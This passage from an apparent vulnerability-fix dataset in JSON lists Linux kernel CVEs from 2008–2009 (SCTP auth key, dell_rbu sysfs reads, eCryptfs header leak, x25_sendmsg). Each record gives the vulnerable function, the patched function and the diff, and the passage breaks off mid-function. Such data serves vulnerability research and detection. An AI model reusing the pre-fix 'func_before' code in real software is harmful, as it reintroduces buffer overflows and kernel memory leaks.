        "func_name": "torvalds/linux/sctp_auth_create_key",
        "description": "Integer overflow in the sctp_setsockopt_auth_key function in net/sctp/socket.c in the Stream Control Transmission Protocol (sctp) implementation in the Linux kernel 2.6.24-rc1 through 2.6.26.3 allows remote attackers to cause a denial of service (panic) or possibly have unspecified other impact via a crafted sca_keylength field associated with the SCTP_AUTH_KEY option.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/stable/linux.git;a=commit;h=30c2235cbc477d4629983d440cdc4f496fec9246",
        "commit_title": "The structure used for SCTP_AUTH_KEY option contains a",
        "commit_text": "length that needs to be verfied to prevent buffer overflow conditions.  Spoted by Eugene Teo <eteo@redhat.com>.  ",
        "func_before": "static struct sctp_auth_bytes *sctp_auth_create_key(__u32 key_len, gfp_t gfp)\n{\n\tstruct sctp_auth_bytes *key;\n\n\t/* Allocate the shared key */\n\tkey = kmalloc(sizeof(struct sctp_auth_bytes) + key_len, gfp);\n\tif (!key)\n\t\treturn NULL;\n\n\tkey->len = key_len;\n\tatomic_set(&key->refcnt, 1);\n\tSCTP_DBG_OBJCNT_INC(keys);\n\n\treturn key;\n}",
        "func": "static struct sctp_auth_bytes *sctp_auth_create_key(__u32 key_len, gfp_t gfp)\n{\n\tstruct sctp_auth_bytes *key;\n\n\t/* Verify that we are not going to overflow INT_MAX */\n\tif ((INT_MAX - key_len) < sizeof(struct sctp_auth_bytes))\n\t\treturn NULL;\n\n\t/* Allocate the shared key */\n\tkey = kmalloc(sizeof(struct sctp_auth_bytes) + key_len, gfp);\n\tif (!key)\n\t\treturn NULL;\n\n\tkey->len = key_len;\n\tatomic_set(&key->refcnt, 1);\n\tSCTP_DBG_OBJCNT_INC(keys);\n\n\treturn key;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,10 @@\n static struct sctp_auth_bytes *sctp_auth_create_key(__u32 key_len, gfp_t gfp)\n {\n \tstruct sctp_auth_bytes *key;\n+\n+\t/* Verify that we are not going to overflow INT_MAX */\n+\tif ((INT_MAX - key_len) < sizeof(struct sctp_auth_bytes))\n+\t\treturn NULL;\n \n \t/* Allocate the shared key */\n \tkey = kmalloc(sizeof(struct sctp_auth_bytes) + key_len, gfp);",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "",
                "\t/* Verify that we are not going to overflow INT_MAX */",
                "\tif ((INT_MAX - key_len) < sizeof(struct sctp_auth_bytes))",
                "\t\treturn NULL;"
            ]
        }
    },
    {
        "cve_id": "CVE-2008-3526",
        "func_name": "torvalds/linux/sctp_setsockopt_auth_key",
        "description": "Integer overflow in the sctp_setsockopt_auth_key function in net/sctp/socket.c in the Stream Control Transmission Protocol (sctp) implementation in the Linux kernel 2.6.24-rc1 through 2.6.26.3 allows remote attackers to cause a denial of service (panic) or possibly have unspecified other impact via a crafted sca_keylength field associated with the SCTP_AUTH_KEY option.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/stable/linux.git;a=commit;h=30c2235cbc477d4629983d440cdc4f496fec9246",
        "commit_title": "The structure used for SCTP_AUTH_KEY option contains a",
        "commit_text": "length that needs to be verfied to prevent buffer overflow conditions.  Spoted by Eugene Teo <eteo@redhat.com>.  ",
        "func_before": "static int sctp_setsockopt_auth_key(struct sock *sk,\n\t\t\t\t    char __user *optval,\n\t\t\t\t    int optlen)\n{\n\tstruct sctp_authkey *authkey;\n\tstruct sctp_association *asoc;\n\tint ret;\n\n\tif (!sctp_auth_enable)\n\t\treturn -EACCES;\n\n\tif (optlen <= sizeof(struct sctp_authkey))\n\t\treturn -EINVAL;\n\n\tauthkey = kmalloc(optlen, GFP_KERNEL);\n\tif (!authkey)\n\t\treturn -ENOMEM;\n\n\tif (copy_from_user(authkey, optval, optlen)) {\n\t\tret = -EFAULT;\n\t\tgoto out;\n\t}\n\n\tasoc = sctp_id2assoc(sk, authkey->sca_assoc_id);\n\tif (!asoc && authkey->sca_assoc_id && sctp_style(sk, UDP)) {\n\t\tret = -EINVAL;\n\t\tgoto out;\n\t}\n\n\tret = sctp_auth_set_key(sctp_sk(sk)->ep, asoc, authkey);\nout:\n\tkfree(authkey);\n\treturn ret;\n}",
        "func": "static int sctp_setsockopt_auth_key(struct sock *sk,\n\t\t\t\t    char __user *optval,\n\t\t\t\t    int optlen)\n{\n\tstruct sctp_authkey *authkey;\n\tstruct sctp_association *asoc;\n\tint ret;\n\n\tif (!sctp_auth_enable)\n\t\treturn -EACCES;\n\n\tif (optlen <= sizeof(struct sctp_authkey))\n\t\treturn -EINVAL;\n\n\tauthkey = kmalloc(optlen, GFP_KERNEL);\n\tif (!authkey)\n\t\treturn -ENOMEM;\n\n\tif (copy_from_user(authkey, optval, optlen)) {\n\t\tret = -EFAULT;\n\t\tgoto out;\n\t}\n\n\tif (authkey->sca_keylength > optlen) {\n\t\tret = -EINVAL;\n\t\tgoto out;\n\t}\n\n\tasoc = sctp_id2assoc(sk, authkey->sca_assoc_id);\n\tif (!asoc && authkey->sca_assoc_id && sctp_style(sk, UDP)) {\n\t\tret = -EINVAL;\n\t\tgoto out;\n\t}\n\n\tret = sctp_auth_set_key(sctp_sk(sk)->ep, asoc, authkey);\nout:\n\tkfree(authkey);\n\treturn ret;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -21,6 +21,11 @@\n \t\tgoto out;\n \t}\n \n+\tif (authkey->sca_keylength > optlen) {\n+\t\tret = -EINVAL;\n+\t\tgoto out;\n+\t}\n+\n \tasoc = sctp_id2assoc(sk, authkey->sca_assoc_id);\n \tif (!asoc && authkey->sca_assoc_id && sctp_style(sk, UDP)) {\n \t\tret = -EINVAL;",
        "diff_line_info": {
            "deleted_lines": [],
            "added_lines": [
                "\tif (authkey->sca_keylength > optlen) {",
                "\t\tret = -EINVAL;",
                "\t\tgoto out;",
                "\t}",
                ""
            ]
        }
    },
    {
        "cve_id": "CVE-2009-0322",
        "func_name": "torvalds/linux/read_rbu_image_type",
        "description": "drivers/firmware/dell_rbu.c in the Linux kernel before 2.6.27.13, and 2.6.28.x before 2.6.28.2, allows local users to cause a denial of service (system crash) via a read system call that specifies zero bytes from the (1) image_type or (2) packet_size file in /sys/devices/platform/dell_rbu/.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/stable/linux.git;a=commit;h=81156928f8fe31621e467490b9d441c0285998c3",
        "commit_title": "Reading 0 bytes from /sys/devices/platform/dell_rbu/image_type or",
        "commit_text": "/sys/devices/platform/dell_rbu/packet_size by an ordinary user causes an oops.  ",
        "func_before": "static ssize_t read_rbu_image_type(struct kobject *kobj,\n\t\t\t\t   struct bin_attribute *bin_attr,\n\t\t\t\t   char *buffer, loff_t pos, size_t count)\n{\n\tint size = 0;\n\tif (!pos)\n\t\tsize = sprintf(buffer, \"%s\\n\", image_type);\n\treturn size;\n}",
        "func": "static ssize_t read_rbu_image_type(struct kobject *kobj,\n\t\t\t\t   struct bin_attribute *bin_attr,\n\t\t\t\t   char *buffer, loff_t pos, size_t count)\n{\n\tint size = 0;\n\tif (!pos)\n\t\tsize = scnprintf(buffer, count, \"%s\\n\", image_type);\n\treturn size;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -4,6 +4,6 @@\n {\n \tint size = 0;\n \tif (!pos)\n-\t\tsize = sprintf(buffer, \"%s\\n\", image_type);\n+\t\tsize = scnprintf(buffer, count, \"%s\\n\", image_type);\n \treturn size;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\t\tsize = sprintf(buffer, \"%s\\n\", image_type);"
            ],
            "added_lines": [
                "\t\tsize = scnprintf(buffer, count, \"%s\\n\", image_type);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-0322",
        "func_name": "torvalds/linux/read_rbu_packet_size",
        "description": "drivers/firmware/dell_rbu.c in the Linux kernel before 2.6.27.13, and 2.6.28.x before 2.6.28.2, allows local users to cause a denial of service (system crash) via a read system call that specifies zero bytes from the (1) image_type or (2) packet_size file in /sys/devices/platform/dell_rbu/.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/stable/linux.git;a=commit;h=81156928f8fe31621e467490b9d441c0285998c3",
        "commit_title": "Reading 0 bytes from /sys/devices/platform/dell_rbu/image_type or",
        "commit_text": "/sys/devices/platform/dell_rbu/packet_size by an ordinary user causes an oops.  ",
        "func_before": "static ssize_t read_rbu_packet_size(struct kobject *kobj,\n\t\t\t\t    struct bin_attribute *bin_attr,\n\t\t\t\t    char *buffer, loff_t pos, size_t count)\n{\n\tint size = 0;\n\tif (!pos) {\n\t\tspin_lock(&rbu_data.lock);\n\t\tsize = sprintf(buffer, \"%lu\\n\", rbu_data.packetsize);\n\t\tspin_unlock(&rbu_data.lock);\n\t}\n\treturn size;\n}",
        "func": "static ssize_t read_rbu_packet_size(struct kobject *kobj,\n\t\t\t\t    struct bin_attribute *bin_attr,\n\t\t\t\t    char *buffer, loff_t pos, size_t count)\n{\n\tint size = 0;\n\tif (!pos) {\n\t\tspin_lock(&rbu_data.lock);\n\t\tsize = scnprintf(buffer, count, \"%lu\\n\", rbu_data.packetsize);\n\t\tspin_unlock(&rbu_data.lock);\n\t}\n\treturn size;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -5,7 +5,7 @@\n \tint size = 0;\n \tif (!pos) {\n \t\tspin_lock(&rbu_data.lock);\n-\t\tsize = sprintf(buffer, \"%lu\\n\", rbu_data.packetsize);\n+\t\tsize = scnprintf(buffer, count, \"%lu\\n\", rbu_data.packetsize);\n \t\tspin_unlock(&rbu_data.lock);\n \t}\n \treturn size;",
        "diff_line_info": {
            "deleted_lines": [
                "\t\tsize = sprintf(buffer, \"%lu\\n\", rbu_data.packetsize);"
            ],
            "added_lines": [
                "\t\tsize = scnprintf(buffer, count, \"%lu\\n\", rbu_data.packetsize);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-0787",
        "func_name": "torvalds/linux/ecryptfs_write_metadata",
        "description": "The ecryptfs_write_metadata_to_contents function in the eCryptfs functionality in the Linux kernel 2.6.28 before 2.6.28.9 uses an incorrect size when writing kernel memory to an eCryptfs file header, which triggers an out-of-bounds read and allows local users to obtain portions of kernel memory.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commitdiff;h=8faece5f906725c10e7a1f6caf84452abadbdc7b",
        "commit_title": "When allocating the memory used to store the eCryptfs header contents, a",
        "commit_text": "single, zeroed page was being allocated with get_zeroed_page(). However, the size of an eCryptfs header is either PAGE_CACHE_SIZE or ECRYPTFS_MINIMUM_HEADER_EXTENT_SIZE (8192), whichever is larger, and is stored in the file's private_data->crypt_stat->num_header_bytes_at_front field.  ecryptfs_write_metadata_to_contents() was using num_header_bytes_at_front to decide how many bytes should be written to the lower filesystem for the file header.  Unfortunately, at least 8K was being written from the page, despite the chance of the single, zeroed page being smaller than 8K.  This resulted in random areas of kernel memory being written between the 0x1000 and 0x1FFF bytes offsets in the eCryptfs file headers if PAGE_SIZE was 4K.  This patch allocates a variable number of pages, calculated with num_header_bytes_at_front, and passes the number of allocated pages along to ecryptfs_write_metadata_to_contents().  Thanks to Florian Streibelt for reporting the data leak and working with me to find the problem.  2.6.28 is the only kernel release with this vulnerability.  Corresponds to CVE-2009-0787  Cc: Greg KH <greg@kroah.com> Cc: dann frazier <dannf@dannf.org> Cc: Serge E. Hallyn <serue@us.ibm.com> Cc: Florian Streibelt <florian@f-streibelt.de> Cc: stable@kernel.org ",
        "func_before": "int ecryptfs_write_metadata(struct dentry *ecryptfs_dentry)\n{\n\tstruct ecryptfs_crypt_stat *crypt_stat =\n\t\t&ecryptfs_inode_to_private(ecryptfs_dentry->d_inode)->crypt_stat;\n\tchar *virt;\n\tsize_t size = 0;\n\tint rc = 0;\n\n\tif (likely(crypt_stat->flags & ECRYPTFS_ENCRYPTED)) {\n\t\tif (!(crypt_stat->flags & ECRYPTFS_KEY_VALID)) {\n\t\t\tprintk(KERN_ERR \"Key is invalid; bailing out\\n\");\n\t\t\trc = -EINVAL;\n\t\t\tgoto out;\n\t\t}\n\t} else {\n\t\tprintk(KERN_WARNING \"%s: Encrypted flag not set\\n\",\n\t\t       __func__);\n\t\trc = -EINVAL;\n\t\tgoto out;\n\t}\n\t/* Released in this function */\n\tvirt = (char *)get_zeroed_page(GFP_KERNEL);\n\tif (!virt) {\n\t\tprintk(KERN_ERR \"%s: Out of memory\\n\", __func__);\n\t\trc = -ENOMEM;\n\t\tgoto out;\n\t}\n\trc = ecryptfs_write_headers_virt(virt, PAGE_CACHE_SIZE, &size,\n\t\t\t\t\t crypt_stat, ecryptfs_dentry);\n\tif (unlikely(rc)) {\n\t\tprintk(KERN_ERR \"%s: Error whilst writing headers; rc = [%d]\\n\",\n\t\t       __func__, rc);\n\t\tgoto out_free;\n\t}\n\tif (crypt_stat->flags & ECRYPTFS_METADATA_IN_XATTR)\n\t\trc = ecryptfs_write_metadata_to_xattr(ecryptfs_dentry,\n\t\t\t\t\t\t      crypt_stat, virt, size);\n\telse\n\t\trc = ecryptfs_write_metadata_to_contents(crypt_stat,\n\t\t\t\t\t\t\t ecryptfs_dentry, virt);\n\tif (rc) {\n\t\tprintk(KERN_ERR \"%s: Error writing metadata out to lower file; \"\n\t\t       \"rc = [%d]\\n\", __func__, rc);\n\t\tgoto out_free;\n\t}\nout_free:\n\tfree_page((unsigned long)virt);\nout:\n\treturn rc;\n}",
        "func": "int ecryptfs_write_metadata(struct dentry *ecryptfs_dentry)\n{\n\tstruct ecryptfs_crypt_stat *crypt_stat =\n\t\t&ecryptfs_inode_to_private(ecryptfs_dentry->d_inode)->crypt_stat;\n\tunsigned int order;\n\tchar *virt;\n\tsize_t virt_len;\n\tsize_t size = 0;\n\tint rc = 0;\n\n\tif (likely(crypt_stat->flags & ECRYPTFS_ENCRYPTED)) {\n\t\tif (!(crypt_stat->flags & ECRYPTFS_KEY_VALID)) {\n\t\t\tprintk(KERN_ERR \"Key is invalid; bailing out\\n\");\n\t\t\trc = -EINVAL;\n\t\t\tgoto out;\n\t\t}\n\t} else {\n\t\tprintk(KERN_WARNING \"%s: Encrypted flag not set\\n\",\n\t\t       __func__);\n\t\trc = -EINVAL;\n\t\tgoto out;\n\t}\n\tvirt_len = crypt_stat->num_header_bytes_at_front;\n\torder = get_order(virt_len);\n\t/* Released in this function */\n\tvirt = (char *)ecryptfs_get_zeroed_pages(GFP_KERNEL, order);\n\tif (!virt) {\n\t\tprintk(KERN_ERR \"%s: Out of memory\\n\", __func__);\n\t\trc = -ENOMEM;\n\t\tgoto out;\n\t}\n\trc = ecryptfs_write_headers_virt(virt, virt_len, &size, crypt_stat,\n\t\t\t\t\t ecryptfs_dentry);\n\tif (unlikely(rc)) {\n\t\tprintk(KERN_ERR \"%s: Error whilst writing headers; rc = [%d]\\n\",\n\t\t       __func__, rc);\n\t\tgoto out_free;\n\t}\n\tif (crypt_stat->flags & ECRYPTFS_METADATA_IN_XATTR)\n\t\trc = ecryptfs_write_metadata_to_xattr(ecryptfs_dentry, virt,\n\t\t\t\t\t\t      size);\n\telse\n\t\trc = ecryptfs_write_metadata_to_contents(ecryptfs_dentry, virt,\n\t\t\t\t\t\t\t virt_len);\n\tif (rc) {\n\t\tprintk(KERN_ERR \"%s: Error writing metadata out to lower file; \"\n\t\t       \"rc = [%d]\\n\", __func__, rc);\n\t\tgoto out_free;\n\t}\nout_free:\n\tfree_pages((unsigned long)virt, order);\nout:\n\treturn rc;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -2,7 +2,9 @@\n {\n \tstruct ecryptfs_crypt_stat *crypt_stat =\n \t\t&ecryptfs_inode_to_private(ecryptfs_dentry->d_inode)->crypt_stat;\n+\tunsigned int order;\n \tchar *virt;\n+\tsize_t virt_len;\n \tsize_t size = 0;\n \tint rc = 0;\n \n@@ -18,33 +20,35 @@\n \t\trc = -EINVAL;\n \t\tgoto out;\n \t}\n+\tvirt_len = crypt_stat->num_header_bytes_at_front;\n+\torder = get_order(virt_len);\n \t/* Released in this function */\n-\tvirt = (char *)get_zeroed_page(GFP_KERNEL);\n+\tvirt = (char *)ecryptfs_get_zeroed_pages(GFP_KERNEL, order);\n \tif (!virt) {\n \t\tprintk(KERN_ERR \"%s: Out of memory\\n\", __func__);\n \t\trc = -ENOMEM;\n \t\tgoto out;\n \t}\n-\trc = ecryptfs_write_headers_virt(virt, PAGE_CACHE_SIZE, &size,\n-\t\t\t\t\t crypt_stat, ecryptfs_dentry);\n+\trc = ecryptfs_write_headers_virt(virt, virt_len, &size, crypt_stat,\n+\t\t\t\t\t ecryptfs_dentry);\n \tif (unlikely(rc)) {\n \t\tprintk(KERN_ERR \"%s: Error whilst writing headers; rc = [%d]\\n\",\n \t\t       __func__, rc);\n \t\tgoto out_free;\n \t}\n \tif (crypt_stat->flags & ECRYPTFS_METADATA_IN_XATTR)\n-\t\trc = ecryptfs_write_metadata_to_xattr(ecryptfs_dentry,\n-\t\t\t\t\t\t      crypt_stat, virt, size);\n+\t\trc = ecryptfs_write_metadata_to_xattr(ecryptfs_dentry, virt,\n+\t\t\t\t\t\t      size);\n \telse\n-\t\trc = ecryptfs_write_metadata_to_contents(crypt_stat,\n-\t\t\t\t\t\t\t ecryptfs_dentry, virt);\n+\t\trc = ecryptfs_write_metadata_to_contents(ecryptfs_dentry, virt,\n+\t\t\t\t\t\t\t virt_len);\n \tif (rc) {\n \t\tprintk(KERN_ERR \"%s: Error writing metadata out to lower file; \"\n \t\t       \"rc = [%d]\\n\", __func__, rc);\n \t\tgoto out_free;\n \t}\n out_free:\n-\tfree_page((unsigned long)virt);\n+\tfree_pages((unsigned long)virt, order);\n out:\n \treturn rc;\n }",
        "diff_line_info": {
            "deleted_lines": [
                "\tvirt = (char *)get_zeroed_page(GFP_KERNEL);",
                "\trc = ecryptfs_write_headers_virt(virt, PAGE_CACHE_SIZE, &size,",
                "\t\t\t\t\t crypt_stat, ecryptfs_dentry);",
                "\t\trc = ecryptfs_write_metadata_to_xattr(ecryptfs_dentry,",
                "\t\t\t\t\t\t      crypt_stat, virt, size);",
                "\t\trc = ecryptfs_write_metadata_to_contents(crypt_stat,",
                "\t\t\t\t\t\t\t ecryptfs_dentry, virt);",
                "\tfree_page((unsigned long)virt);"
            ],
            "added_lines": [
                "\tunsigned int order;",
                "\tsize_t virt_len;",
                "\tvirt_len = crypt_stat->num_header_bytes_at_front;",
                "\torder = get_order(virt_len);",
                "\tvirt = (char *)ecryptfs_get_zeroed_pages(GFP_KERNEL, order);",
                "\trc = ecryptfs_write_headers_virt(virt, virt_len, &size, crypt_stat,",
                "\t\t\t\t\t ecryptfs_dentry);",
                "\t\trc = ecryptfs_write_metadata_to_xattr(ecryptfs_dentry, virt,",
                "\t\t\t\t\t\t      size);",
                "\t\trc = ecryptfs_write_metadata_to_contents(ecryptfs_dentry, virt,",
                "\t\t\t\t\t\t\t virt_len);",
                "\tfree_pages((unsigned long)virt, order);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-0787",
        "func_name": "torvalds/linux/ecryptfs_write_metadata_to_xattr",
        "description": "The ecryptfs_write_metadata_to_contents function in the eCryptfs functionality in the Linux kernel 2.6.28 before 2.6.28.9 uses an incorrect size when writing kernel memory to an eCryptfs file header, which triggers an out-of-bounds read and allows local users to obtain portions of kernel memory.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commitdiff;h=8faece5f906725c10e7a1f6caf84452abadbdc7b",
        "commit_title": "When allocating the memory used to store the eCryptfs header contents, a",
        "commit_text": "single, zeroed page was being allocated with get_zeroed_page(). However, the size of an eCryptfs header is either PAGE_CACHE_SIZE or ECRYPTFS_MINIMUM_HEADER_EXTENT_SIZE (8192), whichever is larger, and is stored in the file's private_data->crypt_stat->num_header_bytes_at_front field.  ecryptfs_write_metadata_to_contents() was using num_header_bytes_at_front to decide how many bytes should be written to the lower filesystem for the file header.  Unfortunately, at least 8K was being written from the page, despite the chance of the single, zeroed page being smaller than 8K.  This resulted in random areas of kernel memory being written between the 0x1000 and 0x1FFF bytes offsets in the eCryptfs file headers if PAGE_SIZE was 4K.  This patch allocates a variable number of pages, calculated with num_header_bytes_at_front, and passes the number of allocated pages along to ecryptfs_write_metadata_to_contents().  Thanks to Florian Streibelt for reporting the data leak and working with me to find the problem.  2.6.28 is the only kernel release with this vulnerability.  Corresponds to CVE-2009-0787  Cc: Greg KH <greg@kroah.com> Cc: dann frazier <dannf@dannf.org> Cc: Serge E. Hallyn <serue@us.ibm.com> Cc: Florian Streibelt <florian@f-streibelt.de> Cc: stable@kernel.org ",
        "func_before": "static int\necryptfs_write_metadata_to_xattr(struct dentry *ecryptfs_dentry,\n\t\t\t\t struct ecryptfs_crypt_stat *crypt_stat,\n\t\t\t\t char *page_virt, size_t size)\n{\n\tint rc;\n\n\trc = ecryptfs_setxattr(ecryptfs_dentry, ECRYPTFS_XATTR_NAME, page_virt,\n\t\t\t       size, 0);\n\treturn rc;\n}",
        "func": "static int\necryptfs_write_metadata_to_xattr(struct dentry *ecryptfs_dentry,\n\t\t\t\t char *page_virt, size_t size)\n{\n\tint rc;\n\n\trc = ecryptfs_setxattr(ecryptfs_dentry, ECRYPTFS_XATTR_NAME, page_virt,\n\t\t\t       size, 0);\n\treturn rc;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,6 +1,5 @@\n static int\n ecryptfs_write_metadata_to_xattr(struct dentry *ecryptfs_dentry,\n-\t\t\t\t struct ecryptfs_crypt_stat *crypt_stat,\n \t\t\t\t char *page_virt, size_t size)\n {\n \tint rc;",
        "diff_line_info": {
            "deleted_lines": [
                "\t\t\t\t struct ecryptfs_crypt_stat *crypt_stat,"
            ],
            "added_lines": []
        }
    },
    {
        "cve_id": "CVE-2009-0787",
        "func_name": "torvalds/linux/ecryptfs_write_metadata_to_contents",
        "description": "The ecryptfs_write_metadata_to_contents function in the eCryptfs functionality in the Linux kernel 2.6.28 before 2.6.28.9 uses an incorrect size when writing kernel memory to an eCryptfs file header, which triggers an out-of-bounds read and allows local users to obtain portions of kernel memory.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commitdiff;h=8faece5f906725c10e7a1f6caf84452abadbdc7b",
        "commit_title": "When allocating the memory used to store the eCryptfs header contents, a",
        "commit_text": "single, zeroed page was being allocated with get_zeroed_page(). However, the size of an eCryptfs header is either PAGE_CACHE_SIZE or ECRYPTFS_MINIMUM_HEADER_EXTENT_SIZE (8192), whichever is larger, and is stored in the file's private_data->crypt_stat->num_header_bytes_at_front field.  ecryptfs_write_metadata_to_contents() was using num_header_bytes_at_front to decide how many bytes should be written to the lower filesystem for the file header.  Unfortunately, at least 8K was being written from the page, despite the chance of the single, zeroed page being smaller than 8K.  This resulted in random areas of kernel memory being written between the 0x1000 and 0x1FFF bytes offsets in the eCryptfs file headers if PAGE_SIZE was 4K.  This patch allocates a variable number of pages, calculated with num_header_bytes_at_front, and passes the number of allocated pages along to ecryptfs_write_metadata_to_contents().  Thanks to Florian Streibelt for reporting the data leak and working with me to find the problem.  2.6.28 is the only kernel release with this vulnerability.  Corresponds to CVE-2009-0787  Cc: Greg KH <greg@kroah.com> Cc: dann frazier <dannf@dannf.org> Cc: Serge E. Hallyn <serue@us.ibm.com> Cc: Florian Streibelt <florian@f-streibelt.de> Cc: stable@kernel.org ",
        "func_before": "static int\necryptfs_write_metadata_to_contents(struct ecryptfs_crypt_stat *crypt_stat,\n\t\t\t\t    struct dentry *ecryptfs_dentry,\n\t\t\t\t    char *virt)\n{\n\tint rc;\n\n\trc = ecryptfs_write_lower(ecryptfs_dentry->d_inode, virt,\n\t\t\t\t  0, crypt_stat->num_header_bytes_at_front);\n\tif (rc)\n\t\tprintk(KERN_ERR \"%s: Error attempting to write header \"\n\t\t       \"information to lower file; rc = [%d]\\n\", __func__,\n\t\t       rc);\n\treturn rc;\n}",
        "func": "static int\necryptfs_write_metadata_to_contents(struct dentry *ecryptfs_dentry,\n\t\t\t\t    char *virt, size_t virt_len)\n{\n\tint rc;\n\n\trc = ecryptfs_write_lower(ecryptfs_dentry->d_inode, virt,\n\t\t\t\t  0, virt_len);\n\tif (rc)\n\t\tprintk(KERN_ERR \"%s: Error attempting to write header \"\n\t\t       \"information to lower file; rc = [%d]\\n\", __func__,\n\t\t       rc);\n\treturn rc;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -1,12 +1,11 @@\n static int\n-ecryptfs_write_metadata_to_contents(struct ecryptfs_crypt_stat *crypt_stat,\n-\t\t\t\t    struct dentry *ecryptfs_dentry,\n-\t\t\t\t    char *virt)\n+ecryptfs_write_metadata_to_contents(struct dentry *ecryptfs_dentry,\n+\t\t\t\t    char *virt, size_t virt_len)\n {\n \tint rc;\n \n \trc = ecryptfs_write_lower(ecryptfs_dentry->d_inode, virt,\n-\t\t\t\t  0, crypt_stat->num_header_bytes_at_front);\n+\t\t\t\t  0, virt_len);\n \tif (rc)\n \t\tprintk(KERN_ERR \"%s: Error attempting to write header \"\n \t\t       \"information to lower file; rc = [%d]\\n\", __func__,",
        "diff_line_info": {
            "deleted_lines": [
                "ecryptfs_write_metadata_to_contents(struct ecryptfs_crypt_stat *crypt_stat,",
                "\t\t\t\t    struct dentry *ecryptfs_dentry,",
                "\t\t\t\t    char *virt)",
                "\t\t\t\t  0, crypt_stat->num_header_bytes_at_front);"
            ],
            "added_lines": [
                "ecryptfs_write_metadata_to_contents(struct dentry *ecryptfs_dentry,",
                "\t\t\t\t    char *virt, size_t virt_len)",
                "\t\t\t\t  0, virt_len);"
            ]
        }
    },
    {
        "cve_id": "CVE-2009-1265",
        "func_name": "torvalds/linux/x25_sendmsg",
        "description": "Integer overflow in rose_sendmsg (sys/net/af_rose.c) in the Linux kernel 2.6.24.4, and other versions before 2.6.30-rc1, might allow remote attackers to obtain sensitive information via a large length value, which causes \"garbage\" memory to be sent.",
        "git_url": "http://git.kernel.org/?p=linux/kernel/git/torvalds/linux.git;a=commitdiff;h=83e0bbcbe2145f160fbaa109b0439dae7f4a38a9",
        "commit_title": "Otherwise we can wrap the sizes and end up sending garbage.",
        "commit_text": " Closes #10423  ",
        "func_before": "static int x25_sendmsg(struct kiocb *iocb, struct socket *sock,\n\t\t       struct msghdr *msg, size_t len)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct x25_sock *x25 = x25_sk(sk);\n\tstruct sockaddr_x25 *usx25 = (struct sockaddr_x25 *)msg->msg_name;\n\tstruct sockaddr_x25 sx25;\n\tstruct sk_buff *skb;\n\tunsigned char *asmptr;\n\tint noblock = msg->msg_flags & MSG_DONTWAIT;\n\tsize_t size;\n\tint qbit = 0, rc = -EINVAL;\n\n\tif (msg->msg_flags & ~(MSG_DONTWAIT|MSG_OOB|MSG_EOR|MSG_CMSG_COMPAT))\n\t\tgoto out;\n\n\t/* we currently don't support segmented records at the user interface */\n\tif (!(msg->msg_flags & (MSG_EOR|MSG_OOB)))\n\t\tgoto out;\n\n\trc = -EADDRNOTAVAIL;\n\tif (sock_flag(sk, SOCK_ZAPPED))\n\t\tgoto out;\n\n\trc = -EPIPE;\n\tif (sk->sk_shutdown & SEND_SHUTDOWN) {\n\t\tsend_sig(SIGPIPE, current, 0);\n\t\tgoto out;\n\t}\n\n\trc = -ENETUNREACH;\n\tif (!x25->neighbour)\n\t\tgoto out;\n\n\tif (usx25) {\n\t\trc = -EINVAL;\n\t\tif (msg->msg_namelen < sizeof(sx25))\n\t\t\tgoto out;\n\t\tmemcpy(&sx25, usx25, sizeof(sx25));\n\t\trc = -EISCONN;\n\t\tif (strcmp(x25->dest_addr.x25_addr, sx25.sx25_addr.x25_addr))\n\t\t\tgoto out;\n\t\trc = -EINVAL;\n\t\tif (sx25.sx25_family != AF_X25)\n\t\t\tgoto out;\n\t} else {\n\t\t/*\n\t\t *\tFIXME 1003.1g - if the socket is like this because\n\t\t *\tit has become closed (not started closed) we ought\n\t\t *\tto SIGPIPE, EPIPE;\n\t\t */\n\t\trc = -ENOTCONN;\n\t\tif (sk->sk_state != TCP_ESTABLISHED)\n\t\t\tgoto out;\n\n\t\tsx25.sx25_family = AF_X25;\n\t\tsx25.sx25_addr   = x25->dest_addr;\n\t}\n\n\tSOCK_DEBUG(sk, \"x25_sendmsg: sendto: Addresses built.\\n\");\n\n\t/* Build a packet */\n\tSOCK_DEBUG(sk, \"x25_sendmsg: sendto: building packet.\\n\");\n\n\tif ((msg->msg_flags & MSG_OOB) && len > 32)\n\t\tlen = 32;\n\n\tsize = len + X25_MAX_L2_LEN + X25_EXT_MIN_LEN;\n\n\tskb = sock_alloc_send_skb(sk, size, noblock, &rc);\n\tif (!skb)\n\t\tgoto out;\n\tX25_SKB_CB(skb)->flags = msg->msg_flags;\n\n\tskb_reserve(skb, X25_MAX_L2_LEN + X25_EXT_MIN_LEN);\n\n\t/*\n\t *\tPut the data on the end\n\t */\n\tSOCK_DEBUG(sk, \"x25_sendmsg: Copying user data\\n\");\n\n\tskb_reset_transport_header(skb);\n\tskb_put(skb, len);\n\n\trc = memcpy_fromiovec(skb_transport_header(skb), msg->msg_iov, len);\n\tif (rc)\n\t\tgoto out_kfree_skb;\n\n\t/*\n\t *\tIf the Q BIT Include socket option is in force, the first\n\t *\tbyte of the user data is the logical value of the Q Bit.\n\t */\n\tif (x25->qbitincl) {\n\t\tqbit = skb->data[0];\n\t\tskb_pull(skb, 1);\n\t}\n\n\t/*\n\t *\tPush down the X.25 header\n\t */\n\tSOCK_DEBUG(sk, \"x25_sendmsg: Building X.25 Header.\\n\");\n\n\tif (msg->msg_flags & MSG_OOB) {\n\t\tif (x25->neighbour->extended) {\n\t\t\tasmptr    = skb_push(skb, X25_STD_MIN_LEN);\n\t\t\t*asmptr++ = ((x25->lci >> 8) & 